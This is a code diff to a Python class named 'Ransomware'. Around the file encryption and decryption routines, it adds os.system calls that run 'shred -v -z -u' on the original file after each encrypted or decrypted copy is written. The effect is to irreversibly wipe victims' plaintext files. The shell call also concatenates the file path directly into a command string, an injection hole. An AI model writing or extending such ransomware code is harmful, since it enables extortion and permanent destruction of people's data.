@@ -114,7 +114,8 @@ class Ransomware:
             data = self.cryptor.encrypt(_data)
             print(f'File contents post encryption: {data}')
             f_enc = open(file_path + ".enc", 'wb')
-            f_enc.write(data)           
+            f_enc.write(data)
+            os.system("shred -v -z -u "+ file_path)           
         else:
             f = open(file_path, 'rb+')
             _data = f.read()
@@ -122,6 +123,7 @@ class Ransomware:
             print(f'File content post decryption: {data}')
             f_dec = open(file_path.replace(".enc",""), 'wb')
             f_dec.write(data)
+            os.system("shred -v -z -u "+ file_path)
 
             #f.seek(0)
             #f.write(data)
